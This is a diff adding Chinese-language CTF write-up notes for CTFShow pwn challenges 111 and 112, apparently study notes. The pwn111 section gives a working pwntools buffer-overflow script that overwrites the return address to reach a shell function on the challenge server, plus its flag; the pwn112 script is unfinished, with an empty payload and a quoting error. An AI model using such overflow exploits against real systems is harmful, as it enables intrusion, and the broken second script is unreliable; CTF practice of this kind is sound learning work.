@@ -1,5 +1,95 @@
 # CTFShow-Pwn(111-144)
 
+# Bypass安全机制
+
+## 111. pwn111
+
+64位，只开了nx
+
+
+
+溢出136位，直接写了
+
+有个`do_global` 函数
+
+```
+from pwn import *
+context(arch="amd64",os="linux",log_level="debug")
+
+# io = process("./pwn")
+
+ip = "pwn.challenge.ctf.show"
+port = 28229
+io = remote(ip,port)
+
+shell_addr = 0x400698
+
+payload = flat([cyclic(136),shell_addr])
+
+io.recvuntil(b'Input your message:')
+
+io.sendline(payload)
+
+io.interactive()
+```
+
+
+
+直接就有了
+
+```
+ctfshow{7fdfd7b6-ec32-4f83-b085-a79a1bfe6b08}
+```
+
+
+
+
+
+## 112. pwn112
+
+32位全开
+
+`partial relro`
+
+
+
+直接进到`register_tm()`函数就可以了。
+
+
+
+var变量在bss区
+
+
+
+```
+from pwn import *
+context(arch="i386",os="linux",log_level="debug")
+
+# io = process("./pwn")
+
+ip = "pwn.challenge.ctf.show"
+port = 28229
+
+io = remote(ip,port)
+
+
+payload = 
+
+io.recvuntil(b'What's your name?')
+
+io.sendline(payload)
+
+io.interactive()
+```
+
+
+
+
+
+
+
+
+
 
 
 # 堆利用-前置基础
